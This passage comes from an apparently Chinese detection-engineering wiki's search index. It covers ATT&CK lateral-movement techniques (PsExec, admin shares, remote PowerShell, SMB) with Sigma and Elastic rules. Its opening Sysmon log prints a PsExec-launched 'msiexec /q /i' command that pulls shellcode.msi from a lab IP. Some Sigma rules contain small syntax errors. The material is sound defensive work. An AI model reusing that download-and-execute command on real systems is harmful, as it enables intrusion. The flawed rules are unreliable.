\"C:\\Windows\\System32\\cmd.exe\"\n\nEventID\uff1a1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15:09:29.284\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\nProcessId: 4044\nImage: C:\\Windows\\PSEXESVC.exe\nFileVersion: 2.2\nDescription: PsExec Service\nProduct: Sysinternals PsExec\nCompany: Sysinternals\nOriginalFileName: psexesvc.exe\nCommandLine: C:\\Windows\\PSEXESVC.exe\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1=A17C21B909C56D93D978014E63FB06926EAEA8E7\nParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}\nParentProcessId: 496\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe\n\nEventID\uff1a1\nProcess Create:\nRuleName:\nUtcTime: 2020-04-18 15:09:29.440\nProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}\nProcessId: 1916\nImage: C:\\Windows\\System32\\msiexec.exe\nFileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Windows\u00ae installer\nProduct: Windows Installer - Unicode\nCompany: Microsoft Corporation\nOriginalFileName: msiexec.exe\nCommandLine: \"msiexec.exe\" /q /i http://192.168.126.146/shellcode.msi\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD\nParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}\nParentProcessId: 4044\nParentImage: C:\\Windows\\PSEXESVC.exe\nParentCommandLine: C:\\Windows\\PSEXESVC.exe\n</code></pre> <p>\u7531\u4e8esysmon\u914d\u7f6e\u95ee\u9898\uff0c\u53ea\u5bf9\u8fdb\u7a0b\u521b\u5efa\u884c\u4e3a\u8fdb\u884c\u76d1\u63a7</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_8","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0\u5177\u4f53\u68c0\u6d4b\u89c4\u5219\uff0c\u53ef\u6839\u636ePsExec\u7279\u5f81\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1021-002</p> <p>https://attack.mitre.org/techniques/T1021/002/</p> <p>\u57fa\u4e8e\u767d\u540d\u5355PsExec\u6267\u884cpayload</p> <p>https://blog.csdn.net/ws13129/article/details/89879771</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/","title":"T1021-002-windows-\u7ba1\u7406\u5458\u5171\u4eab","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u5668\u5e10\u6237\u963b\u6b62\uff08SMB\uff09\u4f7f\u7528\u6709\u6548\u5e10\u6237\u4e0e\u8fdc\u7a0b\u7f51\u7edc\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002</p> <p>SMB\u662f\u540c\u4e00\u7f51\u7edc\u6216\u57df\u4e0aWindows\u8ba1\u7b97\u673a\u7684\u6587\u4ef6\uff0c\u6253\u5370\u673a\u548c\u4e32\u884c\u7aef\u53e3\u5171\u4eab\u534f\u8bae\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528SMB\u4e0e\u6587\u4ef6\u5171\u4eab\u8fdb\u884c\u4ea4\u4e92\uff0c\u4ece\u800c\u5141\u8bb8\u4ed6\u4eec\u5728\u6574\u4e2a\u7f51\u7edc\u4e2d\u6a2a\u5411\u79fb\u52a8\u3002SMB\u7684Linux\u548cmacOS\u5b9e\u73b0\u901a\u5e38\u4f7f\u7528Samba\u3002</p> <p>Windows\u7cfb\u7edf\u5177\u6709\u9690\u85cf\u7684\u7f51\u7edc\u5171\u4eab\uff0c\u53ea\u6709\u7ba1\u7406\u5458\u624d\u80fd\u8bbf\u95ee\u5b83\u4eec\uff0c\u5e76\u63d0\u4f9b\u4e86\u8fdc\u7a0b\u6587\u4ef6\u590d\u5236\u548c\u5176\u4ed6\u7ba1\u7406\u529f\u80fd\u3002\u4f8b\u5982\u7f51\u7edc\u5171\u4eab\u5305\u62ecC$\uff0cADMIN$\uff0c\u548cIPC$\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u6b64\u6280\u672f\u4e0e\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u6709\u6548\u5e10\u6237\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u901a\u8fc7SMB\u8fdc\u7a0b\u8bbf\u95ee\u7f51\u7edc\u7cfb\u7edf\uff1b\u4f7f\u7528\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\u4e0e\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff1b\u4f20\u8f93\u6587\u4ef6\uff1b\u4ee5\u53ca\u901a\u8fc7\u8fdc\u7a0b\u6267\u884c\u6765\u8fd0\u884c\u4f20\u8f93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4f9d\u8d56\u4e8eSMB/RPC\u4e0a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u4f1a\u8bdd\u7684\u793a\u4f8b\u6267\u884c\u6280\u672f\u4e3a\u8ba1\u5212\u4efb\u52a1/\u4f5c\u4e1a\uff0c\u670d\u52a1\u6267\u884c\u548cWindows\u7ba1\u7406\u89c4\u8303\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528NTLM\u54c8\u5e0c\u8bbf\u95ee\u5177\u6709\u6563\u5217\uff0c\u7279\u5b9a\u914d\u7f6e\u548c\u8865\u4e01\u7a0b\u5e8f\u7ea7\u522b\u7684\u7cfb\u7edf\u4e0a\u7684\u7ba1\u7406\u5458\u5171\u4eab\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Netflow</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u867d\u7136\u53ef\u80fd\u6709\u66f4\u591a\u57fa\u4e8e\u4e3b\u673a\u65e5\u5fd7\u7684\u65b9\u6cd5\u53ef\u4ee5\u68c0\u6d4b\u4e3b\u673a\u4e0a\u7684\u8be6\u7ec6SMB\u4e8b\u4ef6\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u63d0\u53d6\u68c0\u6d4b\u5230\u5b83\u4eec\u3002\u4f7f\u7528\u6b63\u786e\u7684\u534f\u8bae\u89e3\u6790\u5668\uff0c\u53ef\u4ee5\u8fc7\u6ee4\u7aef\u53e3445\u6d41\u91cf\uff0c\u751a\u81f3\u53ef\u4ee5\u68c0\u7d22\u6587\u4ef6\u8def\u5f84\uff08\u76f8\u5bf9\u4e8e\u5171\u4eab\uff09\u3002</p> <p>flow = search Flow:Message smb_events = filter flow where (dest_port == \"445\" and protocol == \"smb\") smb_events.file_name = smb_events.proto_info.file_name output smb_write</p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u57fa\u4e8e\u8fd9\u6837\u7684\u68c0\u6d4b\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u5927\u91cf\u7684\u8bef\u62a5\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-002-win-%E7%AE%A1%E7%90%86%E5%91%98%E5%85%B1%E4%BA%AB/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1021-002</p> <p>https://attack.mitre.org/techniques/T1021/002/</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/","title":"T1021-006-win-\u8fdc\u7a0bpowershell\u4f1a\u8bdd","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u201c \u6709\u6548\u5e10\u6237\u201d\u4f7f\u7528Windows\u8fdc\u7a0b\u7ba1\u7406\uff08WinRM\uff09\u4e0e\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002\u7136\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ee5\u767b\u5f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u64cd\u4f5c\u3002</p> <p>WinRM\u662fWindows\u670d\u52a1\u548c\u534f\u8bae\u7684\u540d\u79f0\uff0c\u8be5\u534f\u8bae\u5141\u8bb8\u7528\u6237\u4e0e\u8fdc\u7a0b\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\uff08\u4f8b\u5982\uff0c\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u4fee\u6539\u670d\u52a1\uff09\u3002\u53ef\u4ee5\u4f7f\u7528winrm\u547d\u4ee4\u6216\u4efb\u4f55\u6570\u91cf\u7684\u7a0b\u5e8f\uff08\u4f8b\u5982PowerShell\uff09\u6765\u8c03\u7528\u5b83\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u672c\u6d4b\u8bd5\u6848\u4f8b\u4e3b\u8981\u6a21\u62dfpowershell Enter-PSSession -ComputerName \\&lt;RemoteHost&gt;\u521b\u5efa\u4e00\u4e2a\u8fdc\u7a0bPowerShell\u4f1a\u8bdd\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7 OR windows powershell\u65e5\u5fd7</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u4e8b\u4ef6ID\uff0c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u5b50\u7236\u8fdb\u7a0b\u7b49\u4fe1\u606f\uff08\u5bf9\u7cfb\u7edf\u7248\u672c\u8981\u6c42\u8f83\u9ad8\uff09</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: win_\u8fdc\u7a0bpowershell\u4f1a\u8bdd\ndescription: windows server 2016\ntags: T1021-006\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\dllhost.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\svchost.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n    selection2:\n        EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\n        Newprocessname: 'C:\\Windows\\System32\\wsmprovhost.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0\n        Creatorprocessname: 'C:\\Windows\\System32\\svchost.exe' #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0\n        Processcommandline: 'C:\\Windows\\system32\\wsmprovhost.exe -Embedding' #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\n    timeframe: last 2s\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1021-006-win-%E8%BF%9C%E7%A8%8Bpowershell%E4%BC%9A%E8%AF%9D/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1021-006</p> <p>https://attack.mitre.org/techniques/T1021/006/</p> <p>winrm service</p> <p>https://www.cnblogs.com/gamewyd/p/6805595.html</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/","title":"T1210-win-\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u4e00\u65e6\u8fdb\u5165\u7f51\u7edc\uff0c\u4fbf\u53ef\u80fd\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u83b7\u5f97\u5bf9\u5185\u90e8\u7cfb\u7edf\u7684\u672a\u6388\u6743\u8bbf\u95ee\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u5efa\u7acb\u7acb\u8db3\u70b9\u540e\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u7684\u76ee\u6807\u662f\u6a2a\u5411\u79fb\u52a8\u4ee5\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u7684\u8bbf\u95ee\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u8fdc\u7a0b\u7cfb\u7edf\u662f\u5426\u5904\u4e8e\u6613\u53d7\u653b\u51fb\u72b6\u6001\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u626b\u63cf\u6216\u5176\u4ed6\u53d1\u73b0\u65b9\u6cd5\u6765\u5b8c\u6210\uff0c\u4ee5\u5bfb\u627e\u5728\u7f51\u7edc\u4e2d\u90e8\u7f72\u7684\u5e38\u89c1\u6613\u53d7\u653b\u51fb\u8f6f\u4ef6\uff0c\u68c0\u6d4b\u6216\u5305\u542b\u8fdc\u7a0b\u5229\u7528\u7684\u6f0f\u6d1e\u6216\u5b89\u5168\u8f6f\u4ef6\u3002\u670d\u52a1\u5668\u53ef\u80fd\u662f\u6a2a\u5411\u79fb\u52a8\u4e2d\u7684\u9ad8\u4ef7\u503c\u76ee\u6807\uff0c\u4f46\u662f\u5982\u679c\u7aef\u70b9\u7cfb\u7edf\u63d0\u4f9b\u8bbf\u95ee\u5176\u4ed6\u8d44\u6e90\u7684\u65b9\u5f0f\uff0c\u5219\u7aef\u70b9\u7cfb\u7edf\u4e5f\u53ef\u80fd\u5904\u4e8e\u5371\u9669\u4e4b\u4e2d\u3002</p> <p>\u5e38\u89c1\u670d\u52a1\uff08\u4f8b\u5982SMB\u548cRDP\uff09\u4ee5\u53ca\u53ef\u80fd\u5728\u5185\u90e8\u7f51\u7edc\uff08\u4f8b\u5982MySQL\uff09\u548cWeb\u670d\u52a1\u5668\u670d\u52a1\u4e2d\u4f7f\u7528\u7684\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5b58\u5728\u591a\u4e2a\u4f17\u6240\u5468\u77e5\u7684\u6f0f\u6d1e\u3002</p> <p>\u6839\u636e\u6613\u53d7\u653b\u51fb\u7684\u8fdc\u7a0b\u670d\u52a1\u7684\u6743\u9650\u7ea7\u522b\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u7531\u4e8e\u6a2a\u5411\u79fb\u52a8\u5229\u7528\u800c\u5b9e\u73b0\u5bf9\u7279\u6743\u5347\u7ea7\u7684\u5229\u7528\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u8bc6\u522b\u901a\u8fc7\u7aef\u53e3445\u8fdb\u884c\u7f51\u7edc\u8fde\u63a5\u7684\u53ef\u7591\u8fdb\u7a0b\u3002Windows\u6587\u4ef6\u5171\u4eab\u901a\u5e38\u901a\u8fc7\u670d\u52a1\u5668\u6d88\u606f\u5757\uff08SMB\uff09\u5b9e\u73b0\uff0cSMB\u4f7f\u7528\u7aef\u53e3445\u5728\u4e3b\u673a\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u3002\u5f53\u5408\u6cd5\u65f6\uff0c\u8fd9\u4e9b\u7f51\u7edc\u8fde\u63a5\u7531\u5185\u6838\u5efa\u7acb\u3002\u5efa\u7acb445/tcp\u8fde\u63a5\u7684\u8fdb\u7a0b\u53ef\u80fd\u662f\u7aef\u53e3\u626b\u63cf\u7a0b\u5e8f\u3001\u6f0f\u6d1e\u5229\u7528\u6216\u6a2a\u5411\u79fb\u52a8\u7684\u53ef\u7591\u7528\u6237\u7ea7\u8fdb\u7a0b\u3002</p> <p>\u4ec5\u63d0\u4f9b\u7b80\u5355\u6848\u4f8b\uff1a</p> <p>\u5728Windows\u4e2d\u5220\u9664/\u5207\u6362\u5df2\u5efa\u7acb\u7684Samba\u5171\u4eab\u8fde\u63a5</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b</p> <p>windows server 2016/win10</p> <pre><code>The Windows Filtering Platform has allowed a connection.\n\nApplication Information:\n\n   Process ID:  1752\n   Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe\n\nNetwork Information:\n\n   Direction:  Inbound\n   Source Address:  10.45.45.103\n   Source Port:  53\n   Destination Address: 10.45.45.103\n   Destination Port:  50146\n   Protocol:  17\n\nFilter Information:\n\n   Filter Run-Time ID: 5\n   Layer Name:  Receive/Accept\n   Layer Run-Time ID: 44\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a\ndescription: \u901a\u8fc7windows\u65e5\u5fd7\u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a\ntags: T1210\nstatus: experimental\nreferences:\n    - https://www.elastic.co/guide/en/siem/guide/current/direct-outbound-smb-connection.html\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n          EventID: 5156\n          Destination Port: 445\n    selection2:\n          Destination Address:\n                       - 127.0.0.1\n                       - ::1\n    selection3:\n          Process ID: 4\n    condition: selection1 and not selection2 and not selection3)\nlevel: medium\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#elastic-rule-query","title":"Elastic rule query","text":"<pre><code>event.action:\"Network connection detected (rule: NetworkConnect)\" and\ndestination.port:445 and not process.pid:4 and not\ndestination.ip:(127.0.0.1 or \"::1\")\n</code></pre>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_6","title":"\u5efa\u8bae","text":"<p>\u89c4\u5219\u672a\u7ecf\u7ebf\u4e0a\u6d4b\u8bd5\uff0c\u8c28\u614e\u4f7f\u7528\uff0c\u4f46\u662f\u6211\u76f8\u4fe1\u5b83\u80fd\u591f\u5f88\u597d\u7684\u5e2e\u52a9\u4f60\u53d1\u73b0\u7f51\u5185\u7684\u5a01\u80c1\u3002</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E5%BC%82%E5%B8%B8%E7%9A%84SMB%E9%93%BE%E6%8E%A5%E8%A1%8C%E4%B8%BA/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1210</p> <p>https://attack.mitre.org/techniques/T1210</p> <p>\u68c0\u6d4b\u5f02\u5e38\u7684SMB\u94fe\u63a5\u884c\u4e3a</p> <p>https://www.elastic.co/guide/en/siem/guide/current/direct-outbound-smb-connection.html</p> <p>windows\u4e8b\u4ef6ID-5156\u6837\u4f8b</p> <p>https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=5156</p> <p>\u5728Windows\u4e2d\u5220\u9664/\u5207\u6362\u5df2\u5efa\u7acb\u7684Samba\u5171\u4eab\u8fde\u63a5</p> <p>https://blog.csdn.net/u013038461/article/details/39934061</p>"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"T1210-win-\u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528","text":""},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u4e00\u65e6\u8fdb\u5165\u7f51\u7edc\uff0c\u4fbf\u53ef\u80fd\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u83b7\u5f97\u5bf9\u5185\u90e8\u7cfb\u7edf\u7684\u672a\u6388\u6743\u8bbf\u95ee\u3002\u5f53\u653b\u51fb\u8005\u5229\u7528\u7a0b\u5e8f\uff0c\u670d\u52a1\u6216\u64cd\u4f5c\u7cfb\u7edf\u8f6f\u4ef6\u6216\u5185\u6838\u672c\u8eab\u5185\u7684\u7f16\u7a0b\u9519\u8bef\u6765\u6267\u884c\u653b\u51fb\u8005\u63a7\u5236\u7684\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5229\u7528\u8f6f\u4ef6\u6f0f\u6d1e\u3002\u5efa\u7acb\u7acb\u8db3\u70b9\u540e\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u7684\u76ee\u6807\u662f\u6a2a\u5411\u79fb\u52a8\u4ee5\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u7684\u8bbf\u95ee\u3002</p> 